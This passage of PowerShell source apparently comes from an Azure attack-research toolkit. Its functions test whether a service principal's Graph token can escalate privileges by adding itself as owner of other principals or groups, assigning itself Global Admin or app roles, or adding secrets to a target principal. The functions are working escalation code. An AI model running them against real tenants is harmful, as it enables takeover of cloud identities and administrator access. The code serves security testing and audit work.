            -TargetSPId "953c2758-28a3-4391-a5ff-ef7bad41bf9d" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken
            -TimeOfTest Get-Date

        Description
        -----------
        Test whether the supplied JWT can promote its associated service principal to the Global Admins role

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetSPId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # If either the test token or GA token expire in the next 5 minutes, bail and report this to the user.

    # Ensure the provided AAD role is activated.

    # Check whether the test SP is already activated for the role. If so, remove the SP from that role and get a new test token for that SP

    # Test whether the SP can add itself as an owner over an existing SP
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalId)"
    }
    $Success = $False
    Try {
        $AddSPOwner = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/owners/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to SP"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfAADAdminRoleAssignment')

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP as owner of the target SP
        # Wait 1 minute for the SP ownership to have propagated in Azure before deleting the SP ownership
        #Start-Sleep -s 60
        #$body = @{
        #    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($SPCreation.id)"
        #}
        #Invoke-RestMethod `
        #    -Headers @{Authorization = "Bearer $($TestToken)" } `
        #    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/owners/`$ref" `
        #    -Method DELETE `
        #    -Body $($body | ConvertTo-Json) `
        #    -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfAsOwnerOfSPDefinition' -Value (Get-Command -Name "Test-MGAddSelfAsOwnerOfSP") -Force
New-Variable -Name 'Test-MGAddSelfAsOwnerOfSPAst' -Value (${Test-MGAddSelfAsOwnerOfSPDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfToAADRole {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can activate itself into an AAD Admin role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to activate the associated principal to the specified AzureAD admin role

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER RoleDefinitionId
        The globally unique ID of the AzureAD admin role you are trying to activate

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSelfToAADRole `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can promote its associated service principal to the Global Admins role

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can activate itself into the provided role and return the test result object
    $body = @{
        "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
        principalId = $TestPrincipalID
        roleDefinitionId = $RoleDefinitionId
        directoryScopeId = "/"
    }
    $Success = $False
    Try {
        $ActivateAADRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Promote self to GA"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfAADAdminRoleAssignment')

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP from the AAD role
        # Wait 1 minute for the AAD admin role activation to have propagated in Azure before deleting it
        Start-Sleep -s 60
        $body = @{
            "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
            principalId = $TestPrincipalID
            roleDefinitionId = $RoleDefinitionId
            directoryScopeId = "/"
        }
        Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
            -Method DELETE `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfToAADRoleDefinition' -Value (Get-Command -Name "Test-MGAddSelfToAADRole") -Force
New-Variable -Name 'Test-MGAddSelfToAADRoleAst' -Value (${Test-MGAddSelfToAADRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfToMGAppRole {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can activate itself into an MS Graph App role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to activate itself into a an MS Graph App role

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER MGAppRoleDefinitionId
        The globally unique ID of the MS Graph app role you are trying to activate

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSelfToMGAppRole `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -MGAppRoleDefinitionId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken `
            -TimeOfTest $(Get-Date)

        Description
        -----------
        Test whether the supplied JWT can grant itself RoleManagement.ReadWrite.Directory

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MGAppRoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
    )

    # If either the test token or GA token expire in the next 5 minutes, bail and report this to the user.

    # Ensure the provided AAD role is activated.

    # Check whether the test SP is already activated for the role. If so, remove the SP from that role and get a new test token for that SP

    # Test whether the SP can activate the RoleManagement.ReadWrite.All MS Graph app role:
    $body = @{
        principalId = $TestPrincipalId
        resourceId  = "9858020a-4c00-4399-9ae4-e7897a8333fa"
        appRoleId   = $MGAppRoleDefinitionId
        startTime   = "2020-01-01T12:00:00Z" # This field is required or the API call will fail. The value does not matter.
        expiryTime  = "2023-01-01T10:00:00Z" # This field is required or the API call will fail. The value does not matter.
    }
    $Success = $False
    Try {
    $GrantAppRole = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TestPrincipalID)/appRoleAssignedTo" `
        -Method POST `
        -Body $($body | ConvertTo-Json) `
        -ContentType 'application/json'
    $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Grant self MG App Role"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfMGAppRoleAssignment')

    If ($Success -Or $HeldPrivilege -Match "RoleManagement.ReadWrite.Directory") {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP from the AAD role
        # Wait 1 minute for the AAD admin role activation to have propagated in Azure before deleting it
        #Start-Sleep -s 60
        #$body = @{
        #    "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
        #    principalId = $TestPrincipalID
        #    roleDefinitionId = $RoleDefinitionId
        #    directoryScopeId = "/"
        #}
        #Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        #    -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" `
        #    -Method DELETE `
        #    -Body $($body | ConvertTo-Json) `
        #    -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfToMGAppRoleDefinition' -Value (Get-Command -Name "Test-MGAddSelfToMGAppRole") -Force
New-Variable -Name 'Test-MGAddSelfToMGAppRoleAst' -Value (${Test-MGAddSelfToMGAppRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddOwnerToRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as owner of a role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can add itself as owner of a role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as an owner of the target security group

    .PARAMETER TargetGroupId
        The globally unique ID of the target role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the test principal can add itself as an owner over the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as owner of a role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateAADRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/owners/`$ref" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddOwnerToRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddOwnerToRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddOwnerToRoleEligibleGroupAst' -Value (${Test-MGAddOwnerToRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddOwnerToNonRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as owner of a non-role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can add itself as owner of a non-role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as an owner of the target security group

    .PARAMETER TargetGroupId
        The globally unique ID of the target non-role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToNonRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the test principal can add itself as an owner over the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as owner of a non-role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateAADRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/owners/`$ref" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to Non-Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddOwnerToNonRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddOwnerToNonRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddOwnerToNonRoleEligibleGroupAst' -Value (${Test-MGAddOwnerToNonRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddMemberToRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as member of a role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add itself to a role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetGroupId
        The globally unique ID of the target role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add itself as a member to the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself to a role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateAADRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add member to Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddMemberToRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddMemberToRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddMemberToRoleEligibleGroupAst' -Value (${Test-MGAddMemberToRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddMemberToNonRoleEligibleGroup {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add itself as member of a non-role eligible security group

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add itself to a non-role eligible security group

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to add as a member to the group

    .PARAMETER TargetGroupId
        The globally unique ID of the target non-role eligible security group

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddOwnerToNonRoleEligibleGroup `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add itself as a member to the group with object ID of "b9801b7a-fcec-44e2-a21b-86cb7ec718e4"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetGroupId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself to a non-role eligible security group
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $ActivateAADRoleTest = Invoke-RestMethod -Headers @{Authorization = "Bearer $($TestToken)" } `
        -Uri            "https://graph.microsoft.com/v1.0/groups/$($TargetGroupId)/members/`$ref" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'
        $Success = $True
    }
    Catch {
        $_
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add member to Non-Role Eligible group"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddMemberToNonRoleEligibleGroupDefinition' -Value (Get-Command -Name "Test-MGAddMemberToNonRoleEligibleGroup") -Force
New-Variable -Name 'Test-MGAddMemberToNonRoleEligibleGroupAst' -Value (${Test-MGAddMemberToNonRoleEligibleGroupDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSecretToSP {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can add a new secret to a service principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to add a new secret to a service principal

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER TargetSPId
        The globally unique ID of the target service principal

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSecretToSP `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetSPId "12b4c92b-d200-422a-adcc-fd2b910bbbaa" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can add a new secret to a service principal with object ID of "12b4c92b-d200-422a-adcc-fd2b910bbbaa"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetSPId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add a new secret to a service principal
    $body = @{
        passwordCredential = @{
            displayName = $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $AddSPKeyCred = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -URI            "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/addPassword" `
            -Method         POST `
            -Body           $($body | ConvertTo-Json) `
            -ContentType    'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add secret to SP"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
